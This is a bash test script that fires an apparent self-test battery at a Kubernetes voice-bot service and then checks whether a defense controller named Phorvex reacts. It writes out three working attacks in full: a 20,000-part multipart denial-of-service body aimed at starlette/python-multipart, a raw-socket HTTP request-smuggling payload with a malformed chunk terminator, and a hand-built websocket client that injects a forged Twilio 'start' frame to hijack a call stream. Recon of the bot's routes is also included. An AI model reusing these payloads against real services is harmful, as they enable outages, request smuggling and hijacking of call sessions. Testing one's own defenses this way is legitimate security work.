#!/usr/bin/env bash
# batche.sh — edge battery vs the voice bot: V23 (multipart DoS), V26 (h11 smuggling),
# V1 (forged /ws start frame). Phorvex observable: voice-defense watches the bot
# (rotate-only, reactiveOnly) — none of these fire a detector -> expect calm; the
# attacks themselves are edge-layer = Phorvex None by design.
set -uo pipefail
NSV=voice; NSX=phorvex-system; CTRL=phorvex-phorvex
OUT=/tmp/px-batche; mkdir -p "$OUT"
kubectl get svc -n $NSV -o jsonpath='{range .items[*]}{.metadata.name} {.spec.ports[*].port}{"\n"}{end}' | tee "$OUT/svcs.txt"
SVC=$(kubectl get svc -n $NSV -o jsonpath='{.items[0].metadata.name}')
PORT=$(kubectl get svc -n $NSV $SVC -o jsonpath='{.spec.ports[0].port}')
echo "edge: $SVC:$PORT" | tee -a "$OUT/svcs.txt"
kubectl get pods -n $NSV -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid}{"\n"}{end}' | tee "$OUT/uids-before.txt"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ); date -Is

kubectl port-forward -n $NSV svc/$SVC 18080:$PORT >/dev/null 2>&1 &
PF=$!; trap 'kill $PF 2>/dev/null' EXIT
sleep 4
B=http://127.0.0.1:18080

echo "=== recon: bot HTTP surface ==="
for p in / /health /docs /openapi.json; do
  printf "GET %s -> " "$p"; curl -s --max-time 8 -o /tmp/bot-resp -w "%{http_code}" "$B$p"; printf "  "; head -c 120 /tmp/bot-resp | tr -d '\n'; echo
done | tee "$OUT/recon.txt"
curl -s --max-time 8 "$B/openapi.json" | jq -r '.paths | keys[]' 2>/dev/null | tee "$OUT/routes.txt"

echo; echo "=== V23: multipart DoS attempt (starlette 0.41.3 / python-multipart 0.0.32) ==="
EP=$(grep -m1 -E '^/(?!ws)' "$OUT/routes.txt" 2>/dev/null || echo "/")
python3 - "$B" "$EP" <<'PY' | tee "$OUT/v23.txt"
import sys, time, urllib.request
base, ep = sys.argv[1], sys.argv[2]
boundary = "x" * 70
part = f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\n" + "A"*100 + "\r\n"
body = (part * 20000) + f"--{boundary}--\r\n"
req = urllib.request.Request(base + ep, data=body.encode(), method="POST",
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
t0 = time.time()
try:
    r = urllib.request.urlopen(req, timeout=25)
    print(f"20k-part multipart POST {ep}: HTTP {r.status} in {time.time()-t0:.1f}s")
except Exception as e:
    print(f"20k-part multipart POST {ep}: {type(e).__name__} {e} after {time.time()-t0:.1f}s")
PY

echo; echo "=== V26: h11 chunked-terminator smuggling attempt (uvicorn uses httptools 0.8.0 — h11 0.16.0 not in parse path) ==="
python3 - "$B" <<'PY' | tee "$OUT/v26.txt"
import socket, sys, urllib.parse
u = urllib.parse.urlparse(sys.argv[1])
s = socket.create_connection((u.hostname, u.port), timeout=8)
# malformed chunk terminator: "0\r X: Y\r\n\r\n" instead of "0\r\n\r\n"
payload = (b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
           b"Content-Type: text/plain\r\nConnection: close\r\n\r\n"
           b"5\r\nhello\r\n0\r X: Y\r\n\r\nGET /health HTTP/1.1\r\nHost: x\r\n\r\n")
s.sendall(payload); s.settimeout(5)
try: r = s.recv(2048)
except socket.timeout: r = b"<timeout>"
print("response to malformed chunk terminator:", r[:200])
PY

echo; echo "=== V1: forged Twilio 'start' frame on /ws (hand-rolled websocket client) ==="
python3 - "$B" <<'PY' | tee "$OUT/v1.txt"
import socket, sys, urllib.parse, base64, os, json, struct, time
u = urllib.parse.urlparse(sys.argv[1]); path = "/ws"
s = socket.create_connection((u.hostname, u.port), timeout=8)
key = base64.b64encode(os.urandom(16)).decode()
s.sendall((f"GET {path} HTTP/1.1\r\nHost: {u.hostname}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
resp = s.recv(4096)
print("handshake:", resp.split(b"\r\n")[0].decode(errors="replace"))
if b"101" in resp.split(b"\r\n")[0]:
    frame = json.dumps({"event":"start","streamSid":"MZ_FORGED","start":{"callSid":"CA_FORGED_V1_HIJACK",
        "mediaFormat":{"encoding":"audio/x-mulaw","sampleRate":8000,"channels":1}}}).encode()
    mask = os.urandom(4); hdr = b"\x81" + bytes([0x80 | len(frame)])
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(frame))
    s.sendall(hdr + mask + masked)
    time.sleep(2); s.settimeout(3)
    try: print("post-start bytes:", s.recv(2048)[:120])
    except socket.timeout: print("post-start: <no reply> (pipeline may be initializing — check bot logs)")
PY
echo "-- bot logs for the forged callSid:"
kubectl logs -n $NSV deploy/voice-bot --since=3m 2>/dev/null | grep -i "CA_FORGED_V1_HIJACK" | head -3 | tee -a "$OUT/v1.txt" || echo "  (no mention)" | tee -a "$OUT/v1.txt"

echo; echo "=== Phorvex reaction (voice-defense: watched, reactiveOnly — no detector for edge attacks) ==="
kubectl logs -n $NSX deploy/$CTRL --since-time="$T0" 2>/dev/null | grep -iE "voice" | grep -iE "decision|rotate|selected" | tail -6 | tee "$OUT/phorvex-reaction.txt"
echo "(empty = Phorvex calm throughout — no detector, no motion)"
kubectl get pods -n $NSV -o jsonpath='{range .items[*]}{.metadata.name} uid={.metadata.uid} restarts={.status.containerStatuses[0].restartCount}{"\n"}{end}' | tee "$OUT/uids-after.txt"
kill $PF 2>/dev/null
echo done
